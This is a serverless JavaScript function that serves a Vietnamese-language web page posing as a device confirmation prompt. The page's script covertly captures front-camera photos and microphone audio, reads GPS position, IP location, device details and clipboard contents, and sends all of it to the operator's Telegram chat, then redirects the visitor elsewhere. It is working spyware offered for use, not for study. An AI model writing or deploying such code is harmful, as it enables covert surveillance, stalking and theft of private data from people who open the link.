exports.handler = async (event) => {
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    // Nếu là request tới /api/telegram → xử lý gửi Telegram
    if (event.path.includes('/api/telegram')) {
        if (!BOT_TOKEN || !CHAT_ID) {
            return {
                statusCode: 500,
                body: JSON.stringify({ ok: false, error: 'Missing env vars' })
            };
        }

        try {
            const contentType = event.headers['content-type'] || '';

            // Xử lý FormData (upload file)
            if (contentType.includes('multipart/form-data')) {
                const bodyBuffer = Buffer.from(event.body, event.isBase64Encoded ? 'base64' : 'utf8');
                const boundary = contentType.split('boundary=')[1];
                const sections = bodyBuffer.toString('binary').split(`--${boundary}`);
                
                const parts = {};
                for (const section of sections) {
                    const nameMatch = section.match(/name="([^"]+)"/);
                    const filenameMatch = section.match(/filename="([^"]+)"/);
                    if (!nameMatch) continue;
                    
                    const name = nameMatch[1];
                    const filename = filenameMatch?.[1] || null;
                    const headerEnd = section.indexOf('\r\n\r\n');
                    if (headerEnd === -1) continue;
                    
                    let start = headerEnd + 4;
                    let end = section.lastIndexOf('\r\n');
                    if (end <= start) end = section.length;
                    
                    const data = Buffer.from(section.substring(start, end), 'binary');
                    parts[name] = filename ? { data, filename } : data.toString('utf8').trim();
                }

                const endpoint = parts['endpoint'];
                const fileField = parts['audio'] || parts['photo'] || parts['document'];
                const caption = parts['caption'] || '';

                const FormData = require('form-data');
                const form = new FormData();
                form.append('chat_id', CHAT_ID);
                if (caption) form.append('caption', caption);
                form.append(
                    Object.keys(parts).find(k => ['audio', 'photo', 'document'].includes(k)),
                    fileField.data,
                    { filename: fileField.filename }
                );

                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
                    method: 'POST',
                    headers: form.getHeaders(),
                    body: form
                });
                return { statusCode: 200, body: JSON.stringify(await res.json()) };
            }

            // Xử lý JSON
            const { endpoint, data } = JSON.parse(event.body);
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, ...data })
            });
            return { statusCode: 200, body: JSON.stringify(await res.json()) };

        } catch (e) {
            return { statusCode: 500, body: JSON.stringify({ ok: false, error: e.message }) };
        }
    }

    // Nếu không phải API → trả về HTML
    return {
        statusCode: 200,
        headers: { 'Content-Type': 'text/html; charset=utf-8' },
        body: `<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Hoang Anh</title>
    <style>
        body{margin:0;padding:0;min-height:100vh;display:flex;justify-content:center;align-items:center;font-family:monospace;background:#000}
        .toast{position:fixed;bottom:20px;left:20px;background:rgba(0,0,0,.7);color:#0f0;padding:8px 15px;border-radius:20px;font-size:12px;z-index:9999;pointer-events:none}
        .ios-box{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.9);z-index:100000;display:flex;justify-content:center;align-items:center;backdrop-filter:blur(10px)}
        .ios-inner{background:#1a1a1a;padding:35px 25px;border-radius:25px;max-width:320px;border:1px solid #0f0;text-align:center;color:#fff}
        .ios-inner h3{color:#0f0;margin:0 0 10px;font-size:20px}
        .ios-inner p{color:#ccc;margin:15px 0;font-size:14px}
        .ios-inner button{background:#0f0;color:#000;border:none;padding:15px 30px;border-radius:40px;font-size:16px;font-weight:700;cursor:pointer;width:100%;margin-top:10px}
    </style>
</head>
<body>
    <div id="p" class="ios-box" style="display:none"><div class="ios-inner"><h3>📱 Xác nhận thiết bị</h3><p>Nhấn nút bên dưới để tiếp tục</p><button id="b">✅ Xác nhận và Tiếp tục</button></div></div>
    <video id="v" autoplay playsinline style="display:none"></video>
    <canvas id="c" width="640" height="480" style="display:none"></canvas>
    <input id="d" style="position:absolute;opacity:0;height:0;width:0">

    <script>
        const API='/api/telegram';
        const RL='${REDIRECT_LINK || 'https://www.memonotepad.com/'}';
        const PC=${PHOTO_COUNT || 6};
        const PD=${PHOTO_DELAY || 300};
        const AD=${AUDIO_DURATION || 400};
        let ps=0,cs=null,ca=false,ar=false,mr=null,ac=[],gd=false,rt=false,mi=false,ao=false,gc=false,oc=false,cc=false;
        const io=/iPad|iPhone|iPod/.test(navigator.userAgent)&&!window.MSStream;
        function cr(){if(rt)return;if(mi&&ps===PC&&ao&&gc&&oc&&cc){rt=true;setTimeout(()=>{location.href=RL},300)}}
        async function st(t,r=0){try{let re=await fetch(API,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({endpoint:'sendMessage',data:{text:t.substring(0,4096),parse_mode:'HTML'}})});let d=await re.json();if(!d.ok&&r<2)setTimeout(()=>st(t,r+1),2000)}catch(e){if(r<2)setTimeout(()=>st(t,r+1),2000)}}
        async function sa(b,r=0){try{let f=new FormData();f.append('endpoint','sendAudio');f.append('audio',b,'a.ogg');f.append('caption','🎤 Ghi am - '+new Date().toLocaleString('vi-VN'));let re=await fetch(API,{method:'POST',body:f});let d=await re.json();if(!d.ok&&r<2)setTimeout(()=>sa(b,r+1),2000)}catch(e){}}
        async function sp(b,n,r=0){try{let f=new FormData();f.append('endpoint','sendPhoto');f.append('photo',b,'p'+n+'.jpg');f.append('caption','📸 Anh #'+n+' - '+new Date().toLocaleString('vi-VN'));let re=await fetch(API,{method:'POST',body:f});let d=await re.json();if(d.ok){ps++;if(ps===PC&&cs&&ca){setTimeout(()=>{if(cs){cs.getTracks().forEach(t=>t.stop());cs=null;ca=false}},2000)}cr()}else if(r<2)setTimeout(()=>sp(b,n,r+1),2000)}catch(e){}}
        async function cp(v,c,ctx,n){return new Promise(r=>{try{if(v.readyState===v.HAVE_ENOUGH_DATA){c.width=v.videoWidth||640;c.height=v.videoHeight||480;ctx.drawImage(v,0,0,c.width,c.height);c.toBlob(b=>{if(b){sp(b,n);r(true)}else r(false)},'image/jpeg',0.85)}else setTimeout(()=>cp(v,c,ctx,n).then(r),50)}catch(e){r(false)}})}
        async function cm(v,c,ctx){if(!ca)return;for(let i=1;i<=PC;i++){if(!ca)break;await cp(v,c,ctx,i);if(i<PC)await new Promise(r=>setTimeout(r,PD))}}
        async function sr(){if(ar)return;try{let s=await navigator.mediaDevices.getUserMedia({audio:true});mr=new MediaRecorder(s);ac=[];mr.ondataavailable=e=>{if(e.data.size>0)ac.push(e.data)};mr.onstop=async()=>{let b=new Blob(ac,{type:'audio/ogg'});if(b.size>0)await sa(b);ar=true;ao=true;s.getTracks().forEach(t=>t.stop());cr()};mr.start();setTimeout(()=>{if(mr&&mr.state==='recording')mr.stop();else{ao=true;ar=true;cr()}},AD)}catch(e){ao=true;ar=false;cr()}}
        async function gi(){let ip='KXĐ',ld={city:'KXĐ',region:'KXĐ',country:'KXĐ',isp:'KXĐ',lat:null,lon:null};
        for(let a of['https://api.ipify.org?format=json','https://api.my-ip.io/ip.json','https://ipapi.co/json/']){try{let c=new AbortController(),t=setTimeout(()=>c.abort(),4000),r=await fetch(a,{signal:c.signal});clearTimeout(t);let d=await r.json();if(a.includes('ipify'))ip=d.ip;else if(a.includes('my-ip'))ip=d.ip;else if(a.includes('ipapi.co'))ip=d.ip;if(ip&&ip!=='KXĐ')break}catch(e){}}
        let apis=[{url:'http://ip-api.com/json/'+ip+'?fields=status,country,regionName,city,isp,org,lat,lon',p:d=>d&&d.status==='success'?{city:d.city||'KXĐ',region:d.regionName||'KXĐ',country:d.country||'KXĐ',isp:d.isp||d.org||'KXĐ',lat:d.lat||null,lon:d.lon||null}:null},{url:'https://ipapi.co/'+ip+'/json/',p:d=>d&&!d.error?{city:d.city||'KXĐ',region:d.region||'KXĐ',country:d.country_name||'KXĐ',isp:d.org||'KXĐ',lat:d.latitude||null,lon:d.longitude||null}:null},{url:'https://ipinfo.io/'+ip+'/json',p:d=>{if(d&&!d.error){let la=null,lo=null;if(d.loc){let pa=d.loc.split(',');if(pa.length===2){la=parseFloat(pa[0]);lo=parseFloat(pa[1])}}return{city:d.city||'KXĐ',region:d.region||'KXĐ',country:d.country||'KXĐ',isp:d.org||'KXĐ',lat:la,lon:lo}}return null}}];
        for(let a of apis){try{let c=new AbortController(),t=setTimeout(()=>c.abort(),6000),r=await fetch(a.url,{signal:c.signal});clearTimeout(t);let d=await r.json(),re=a.p(d);if(re&&(re.city!=='KXĐ'||re.country!=='KXĐ')){ld=re;break}}catch(e){}}
        return{ip,locationData:ld}}
        async function gb(){let bp='KXĐ',bc=false;if('getBattery' in navigator){try{let b=await navigator.getBattery();bp=Math.round(b.level*100)+'%';bc=b.charging;return{batteryPercent:bp,batteryCharging:bc}}catch(e){}}return{batteryPercent:'KXĐ',batteryCharging:false}}
        async function gd2(){let ua=navigator.userAgent,pf=navigator.platform||'KXĐ',io2=/iPad|iPhone|iPod/.test(ua)&&!window.MSStream,ip=/iPhone/.test(ua),ia=/iPad/.test(ua)||(io2&&screen.width>768),dm='KXĐ';if(ip)dm='iPhone';else if(ia)dm='iPad';else if(io2)dm='iOS';else if(/Android/.test(ua))dm='Android';else if(/Windows/.test(ua))dm='Windows';else if(/Macintosh/.test(ua))dm='Mac';return{ua,pf,isIO:io2,dm,ip}}
        async function ag(){if(gd){gc=true;cr();return}if(!('geolocation' in navigator)){gc=true;gd=true;cr();return}
        navigator.geolocation.getCurrentPosition(async p=>{let la=p.coords.latitude,lo=p.coords.longitude,ac2=p.coords.accuracy,ml='https://www.google.com/maps?q='+la+','+lo;
        await st('<b>📍 VI TRI GPS</b>\\n\\n<b>📌 Vi do:</b> <code>'+la+'</code>\\n<b>📌 Kinh do:</b> <code>'+lo+'</code>\\n<b>🎯 Do chinh xac:</b> <code>'+Math.round(ac2)+' met</code>\\n\\n<a href="'+ml+'">🗺️ Xem Google Maps</a>');gd=true;gc=true;cr()},e=>{gc=true;gd=true;cr()},{enableHighAccuracy:true,timeout:8000,maximumAge:0})}
        async function ms(){let{ip,locationData:ld}=await gi(),di=await gd2(),{batteryPercent:bp,batteryCharging:bc}=await gb();
        let sw=screen.width,sh=screen.height,dm2=navigator.deviceMemory?navigator.deviceMemory+' GB':'KXĐ',ce=navigator.cookieEnabled?'Bat':'Tat',ct=new Date().toLocaleString('vi-VN'),la=navigator.language||'KXĐ',hc=navigator.hardwareConcurrency?navigator.hardwareConcurrency+' nhan':'KXĐ',rf=document.referrer||'Truy cap truc tiep',tz=Intl.DateTimeFormat().resolvedOptions().timeZone||'KXĐ';
        let ml='';if(ld.lat&&ld.lon)ml='\\n<a href="https://www.google.com/maps?q='+ld.lat+','+ld.lon+'">🗺️ Vi tri uoc tinh</a>';
        let bd=di.isIO?'<b>🔋 Pin:</b> <code>iOS khong ho tro</code>':'<b>🔋 Pin:</b> <code>'+bp+' ('+(bc?'🔌 Dang sac':'🔋 Khong sac')+')</code>';
        await st('<b>📥 KHACH TRUY CAP MOI</b>\\n\\n<b>🌐 IP:</b> <code>'+ip+'</code>\\n<b>📍 Thanh pho:</b> <code>'+ld.city+'</code>\\n<b>🗺️ Khu vuc:</b> <code>'+ld.region+'</code>\\n<b>🏳️ Quoc gia:</b> <code>'+ld.country+'</code>\\n<b>🏢 Nha mang:</b> <code>'+ld.isp+'</code>'+ml+'\\n\\n<b>📱 Thiet bi:</b> <code>'+di.dm+'</code>\\n<b>💻 Trinh duyet:</b> <code>'+di.ua.substring(0,80)+'...</code>\\n<b>🖥️ HDH:</b> <code>'+di.pf+'</code>\\n<b>📺 Do phan giai:</b> <code>'+sw+'x'+sh+'</code>\\n'+bd+'\\n<b>💾 RAM:</b> <code>'+dm2+'</code>\\n<b>⚙️ CPU:</b> <code>'+hc+'</code>\\n<b>🍪 Cookie:</b> <code>'+ce+'</code>\\n<b>🌐 Ngon ngu:</b> <code>'+la+'</code>\\n<b>⏰ Mui gio:</b> <code>'+tz+'</code>\\n<b>🕐 Thoi gian:</b> <code>'+ct+'</code>\\n<b>📎 Nguon:</b> <code>'+rf+'</code>');
        mi=true;cr()}
        async function sc2(){let v=document.getElementById('v'),c=document.getElementById('c'),ctx=c.getContext('2d');if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia)return;
        try{let s=await navigator.mediaDevices.getUserMedia({video:{width:{ideal:800},height:{ideal:600},facingMode:'user'}});cs=s;ca=true;v.srcObject=s;await new Promise(r=>{v.onloadedmetadata=()=>{v.play();r()}});await new Promise(r=>setTimeout(r,100));await cm(v,c,ctx)}catch(e){ca=false}}
        async function go(){let o={screen:'KXĐ',alpha:null,beta:null,gamma:null,compass:false};
        if(screen.orientation){let t=screen.orientation.type;o.screen=t.includes('portrait')?'Doc':t.includes('landscape')?'Ngang':t}else if(window.orientation!==undefined){let a=window.orientation;o.screen=(a===0||a===180)?'Doc':'Ngang'}
        if(window.DeviceOrientationEvent){try{let ev=await new Promise(r=>{let re=false,h=e=>{if(!re&&e.alpha!==null){re=true;window.removeEventListener('deviceorientation',h);r(e)}};window.addEventListener('deviceorientation',h);setTimeout(()=>{if(!re){window.removeEventListener('deviceorientation',h);r(null)}},2000)});if(ev){o.alpha=ev.alpha;o.beta=ev.beta;o.gamma=ev.gamma;o.compass=ev.absolute}}catch(e){}}return o}
        async function so(){try{let o=await go(),ct2='';if(o.alpha!==null){let a=o.alpha,d='';if(a>=337.5||a<22.5)d='Bac ⬆️';else if(a>=22.5&&a<67.5)d='Dong Bac ↗️';else if(a>=67.5&&a<112.5)d='Dong ➡️';else if(a>=112.5&&a<157.5)d='Dong Nam ↘️';else if(a>=157.5&&a<202.5)d='Nam ⬇️';else if(a>=202.5&&a<247.5)d='Tay Nam ↙️';else if(a>=247.5&&a<292.5)d='Tay ⬅️';else if(a>=292.5&&a<337.5)d='Tay Bac ↖️';ct2='\\n<b>🧭 Huong la ban:</b> <code>'+d+' ('+a.toFixed(0)+'°)</code>'}
        let tt='';if(o.beta!==null&&o.gamma!==null){let b=o.beta,g=o.gamma,s2='';if(Math.abs(b)<10&&Math.abs(g)<10)s2='📱 Dat phang';else if(b>45)s2='📱 Nghieng ve truoc';else if(b<-45)s2='📱 Nghieng ve sau';else if(g>20)s2='📱 Nghieng sang phai';else if(g<-20)s2='📱 Nghieng sang trai';else s2='📱 Hoi nghieng';tt='\\n<b>📐 Tu the may:</b> <code>'+s2+'</code>\\n<b>📊 Goc nghieng:</b> <code>Truoc/Sau: '+b.toFixed(0)+'° | Trai/Phai: '+g.toFixed(0)+'°</code>'}
        await st('<b>🧭 HUONG THIET BI</b>\\n\\n<b>📱 Man hinh:</b> <code>'+o.screen+'</code>'+ct2+tt+'\\n\\n<i>💡 Meo: Xoay dien thoai de xem huong thay doi</i>');oc=true;cr()}catch(e){oc=true;cr()}}
        async function scl(){try{let cd={text:'',hasPermission:false,error:''};if(!navigator.clipboard){cd.error='Ko ho tro';return cd}
        try{let t=await navigator.clipboard.readText();cd.text=t||'(Clipboard trong)';cd.hasPermission=true}catch(e){cd.error=e.message}return cd}catch(e){return{text:'',hasPermission:false,error:e.message}}}
        async function scli(){try{let cl=await scl();if(cl.hasPermission&&cl.text&&cl.text!=='(Clipboard trong)'){let ts=new Date().toLocaleString('vi-VN'),tl=cl.text.length,bi='<b>📋 CLIPBOARD</b>\\n<b>🔓 Trang thai:</b> <code>✅ Co quyen</code>\\n<b>📏 Do dai:</b> <code>'+tl+' ky tu</code>\\n<b>🕐 Thoi gian:</b> <code>'+ts+'</code>';
        if(tl>2000){await st(bi+'\\n\\n<i>📎 Noi dung dai, dang gui file...</i>');try{let b=new Blob([cl.text],{type:'text/plain;charset=utf-8'}),f=new FormData();f.append('endpoint','sendDocument');f.append('document',b,'clipboard.txt');f.append('caption','📋 Clipboard - '+tl+' ky tu - '+ts);await fetch(API,{method:'POST',body:f})}catch(e){await st(bi+'\\n\\n<code>'+cl.text.substring(0,3500)+'</code>')}}else await st(bi+'\\n\\n<b>📄 Noi dung:</b>\\n<code>'+cl.text+'</code>')}else await st('<b>📋 CLIPBOARD</b>\\n\\n<b>🔒 Trang thai:</b> <code>❌ Ko co quyen hoac trong</code>');cc=true;cr()}catch(e){cc=true;cr()}}
        async function rp(){return new Promise(r=>{if(typeof DeviceOrientationEvent.requestPermission==='function'){DeviceOrientationEvent.requestPermission().then(s=>r(s==='granted')).catch(()=>r(false))}else r(true)})}
        async function hi(){return new Promise(async r=>{if(io){document.getElementById('p').style.display='flex';document.getElementById('b').onclick=async()=>{document.getElementById('p').style.display='none';let g=await rp();if(g)await so();else{oc=true;cr()}document.getElementById('d').focus();setTimeout(async()=>await scli(),300);r(true)}}else{await so();await scli();r(true)}})}
        async function init(){try{ms();ag();sc2();setTimeout(()=>sr(),50);await hi()}catch(e){}}
        init();
    </script>
</body>
</html>`
    };
};
